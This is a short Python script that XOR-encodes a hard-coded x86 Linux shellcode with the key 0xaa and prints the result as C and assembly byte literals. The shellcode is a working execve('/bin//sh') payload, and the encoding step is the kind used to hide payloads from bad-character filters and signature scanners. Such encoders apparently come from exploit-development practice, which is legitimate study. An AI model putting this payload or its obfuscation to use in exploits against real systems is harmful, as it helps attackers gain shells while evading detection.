#! /usr/bin/python3

shell_code = b"\x31\xd2\x52\x89\xe2\x31\xc9\x51\x89\xe1\x31\xdb\x53\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\x19\x31\xc0\xb0\x0b\xcd\x80"
xor_operand = b'\xaa' * len(shell_code)
encoded_shell_code = b''

for shellcodebyte, operandbyte in zip(shell_code, xor_operand):
    result = shellcodebyte ^ operandbyte
    encoded_shell_code += result.to_bytes(1, 'big')

hex_vals = encoded_shell_code.hex()
hex_bytes = []
hex_bytes_comma = []

for index, hexchhar in enumerate(hex_vals):
    if(index % 2 == 1):
        hex_bytes.append(hex_vals[index - 1] + hex_vals[index])
        hex_bytes_comma.append(hex_vals[index - 1] + hex_vals[index]+",")

hex_bytes_formatted = "\\x".join(hex_bytes)
hex_bytes_comma_formatted = "0x".join(hex_bytes_comma).rstrip(",")


print(f"Size of Shellcode: {len(hex_bytes)}")

print()

print("For C:")
print(f'\\x{hex_bytes_formatted}')

print()

print("For Assembly:")
print(f'0x{hex_bytes_comma_formatted}')
